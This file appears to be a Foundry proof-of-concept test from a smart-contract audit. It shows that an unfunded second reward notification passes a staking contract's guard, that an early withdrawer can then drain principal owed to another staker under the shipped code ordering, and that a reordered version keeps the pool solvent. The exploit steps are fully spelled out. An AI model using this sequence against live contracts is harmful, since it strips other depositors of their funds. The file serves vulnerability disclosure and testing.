// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test, console} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {LighthouseLadder} from "../../src/LighthouseLadder.sol";
import {LighthouseLadderFixed} from "./LighthouseLadderFixed.sol";

contract PoCToken is ERC20 {
    constructor() ERC20("Island", "ISL") {}
    function mint(address to, uint256 a) external { _mint(to, a); }
}

contract LadderOrderingPoC is Test {
    PoCToken token;
    LighthouseLadder pool;

    address dist = makeAddr("feeRemittanceSafe");
    address alice = makeAddr("alice"); // victim
    address bob = makeAddr("bob");     // exits first
    uint256 constant DURATION = 60 days;

    function setUp() public {
        token = new PoCToken();
        pool = new LighthouseLadder(dist, address(token), address(token));
        token.mint(alice, 100_000e18);
        token.mint(bob, 100_000e18);
        token.mint(dist, 100_000e18);
        vm.prank(alice); token.approve(address(pool), type(uint256).max);
        vm.prank(bob);   token.approve(address(pool), type(uint256).max);
    }

    // ─────────────────────────────────────────────────────────────────
    // STEP 0: prove the precondition (owed > surplus) is REACHABLE through
    //         the contract's OWN guard, with no cheatcode state forging.
    // ─────────────────────────────────────────────────────────────────
    function _reachOvercommittedState() internal returns (uint256 bobId, uint256 aliceId) {
        vm.prank(alice); aliceId = pool.stake(1_000e18, 7 days);  // 0.4x
        vm.prank(bob);   bobId   = pool.stake(5_000e18, 7 days);  // 0.4x -> 5/6 of weight

        vm.prank(dist); token.transfer(address(pool), 60e18);     // REAL budget in
        vm.prank(dist); pool.notifyRewardAmount(60e18);           // guard passes

        vm.warp(vm.getBlockTimestamp() + DURATION + 1);                  // all 60e18 accrues, unclaimed

        // THE OPERATOR MISTAKE: notify a SECOND period WITHOUT transferring.
        // rewardSurplus() still reads 60e18 (period-1 rewards accrued but never
        // claimed are indistinguishable from fresh budget), so the "over-notify
        // is refused at the door" guard PASSES.
        vm.prank(dist); pool.notifyRewardAmount(60e18);
        vm.warp(vm.getBlockTimestamp() + DURATION + 1);

        console.log("--- OVERCOMMITTED STATE (no cheatcodes, guard-legal) ---");
        console.log("   alice owed  :", pool.earned(alice));
        console.log("   bob   owed  :", pool.earned(bob));
        console.log("   sum owed    :", pool.earned(alice) + pool.earned(bob));
        console.log("   TRUE surplus:", pool.rewardSurplus());
        assertGt(pool.earned(bob), pool.rewardSurplus(), "bob alone is owed more than the surplus");
    }

    function test_00_precondition_isReachable() public {
        _reachOvercommittedState();
    }

    // ─────────────────────────────────────────────────────────────────
    // THE EXPLOIT against the SHIPPED contract.
    // ─────────────────────────────────────────────────────────────────
    function test_01_EXPLOIT_shippedOrderBreaksSolvency() public {
        (uint256 bobId, uint256 aliceId) = _reachOvercommittedState();

        uint256 trueSurplus = pool.rewardSurplus();
        uint256 bobOwed = pool.earned(bob);
        uint256 bobBefore = token.balanceOf(bob);

        vm.prank(bob); pool.withdrawPosition(bobId);

        uint256 bobGot = token.balanceOf(bob) - bobBefore;
        uint256 rewardsPaid = bobGot - 5_000e18;
        console.log("--- AFTER BOB EXITS (shipped order: _close then _payRewards) ---");
        console.log("   rewards paid to bob:", rewardsPaid);
        console.log("   TRUE surplus was   :", trueSurplus);
        console.log("   OVERPAY out of principal:", rewardsPaid - trueSurplus);
        console.log("   pool balance       :", token.balanceOf(address(pool)));
        console.log("   pool totalSupply   :", pool.totalSupply());

        assertEq(rewardsPaid, bobOwed, "paid in FULL - the surplus cap did not bind");
        assertGt(rewardsPaid, trueSurplus, "bob drained past the entire true surplus");
        assertLt(token.balanceOf(address(pool)), pool.totalSupply(),
            "INVARIANT BROKEN: pool balance < principal owed");

        // ALICE'S PRINCIPAL IS NOW UNRECOVERABLE BY ANY DOOR.
        vm.prank(alice); vm.expectRevert(); pool.withdrawPosition(aliceId);
        vm.prank(alice); vm.expectRevert(); pool.emergencyWithdraw(aliceId);
        vm.prank(alice); pool.getReward();                       // take everything she can
        vm.prank(alice); vm.expectRevert(); pool.emergencyWithdraw(aliceId);
        vm.prank(alice); vm.expectRevert(); pool.withdrawPosition(aliceId);

        console.log("--- ALICE IS STRANDED ---");
        console.log("   her principal ledger:", pool.balanceOf(alice));
        console.log("   pool balance left   :", token.balanceOf(address(pool)));
        console.log("   SHORTFALL           :", pool.totalSupply() - token.balanceOf(address(pool)));
    }

    // ─────────────────────────────────────────────────────────────────
    // COUNTERFACTUAL: identical script, only the two lines swapped.
    // ─────────────────────────────────────────────────────────────────
    function test_02_COUNTERFACTUAL_reorderHoldsTheInvariant() public {
        LighthouseLadderFixed fx = new LighthouseLadderFixed(dist, address(token), address(token));
        vm.prank(alice); token.approve(address(fx), type(uint256).max);
        vm.prank(bob);   token.approve(address(fx), type(uint256).max);

        vm.prank(alice); uint256 aliceId = fx.stake(1_000e18, 7 days);
        vm.prank(bob);   uint256 bobId   = fx.stake(5_000e18, 7 days);
        vm.prank(dist);  token.transfer(address(fx), 60e18);
        vm.prank(dist);  fx.notifyRewardAmount(60e18);
        vm.warp(vm.getBlockTimestamp() + DURATION + 1);
        vm.prank(dist);  fx.notifyRewardAmount(60e18);  // SAME unfunded notify
        vm.warp(vm.getBlockTimestamp() + DURATION + 1);

        uint256 trueSurplus = fx.rewardSurplus();
        uint256 bobOwed = fx.earned(bob);
        uint256 bobBefore = token.balanceOf(bob);
        vm.prank(bob); fx.withdrawPosition(bobId);
        uint256 rewardsPaid = token.balanceOf(bob) - bobBefore - 5_000e18;

        console.log("--- REORDERED CONTRACT, SAME ATTACK ---");
        console.log("   bob owed           :", bobOwed);
        console.log("   rewards paid to bob:", rewardsPaid);
        console.log("   true surplus       :", trueSurplus);
        console.log("   bob STILL owed (deferred, not stolen):", fx.rewards(bob));
        console.log("   pool balance       :", token.balanceOf(address(fx)));
        console.log("   pool totalSupply   :", fx.totalSupply());

        assertEq(rewardsPaid, trueSurplus, "cap binds at the TRUE surplus");
        assertGe(token.balanceOf(address(fx)), fx.totalSupply(), "invariant HOLDS");

        uint256 aliceBefore = token.balanceOf(alice);
        vm.prank(alice); fx.withdrawPosition(aliceId);
        assertEq(token.balanceOf(alice) - aliceBefore, 1_000e18, "alice keeps her whole deposit");
        console.log("   alice recovered    :", token.balanceOf(alice) - aliceBefore);
    }

    // ─────────────────────────────────────────────────────────────────
    // Does the bug bite WITHOUT the over-commit precondition (single,
    // properly-funded notify)? If not, the ordering is latent, not live.
    // ─────────────────────────────────────────────────────────────────
    function testFuzz_03_singleFundedNotify_orderingIsLatent(
        uint96 aliceAmt, uint96 bobAmt, uint96 reward, uint32 dur
    ) public {
        aliceAmt = uint96(bound(aliceAmt, 1e15, 5_000e18));
        bobAmt   = uint96(bound(bobAmt,   1e15, 5_000e18));
        reward   = uint96(bound(reward,   1e15, 500e18));
        dur      = uint32(bound(dur, 7 days, 90 days));

        vm.prank(alice); uint256 aliceId = pool.stake(aliceAmt, dur);
        vm.prank(bob);   uint256 bobId   = pool.stake(bobAmt, dur);
        vm.prank(dist);  token.transfer(address(pool), reward);
        vm.prank(dist);  pool.notifyRewardAmount(reward);   // ONE funded notify
        vm.warp(vm.getBlockTimestamp() + uint256(dur) + 1);

        vm.prank(bob);   pool.withdrawPosition(bobId);
        assertGe(token.balanceOf(address(pool)), pool.totalSupply(), "invariant after bob");
        vm.prank(alice); pool.withdrawPosition(aliceId);
        assertGe(token.balanceOf(address(pool)), pool.totalSupply(), "invariant after alice");
        assertEq(pool.totalSupply(), 0);
    }
}
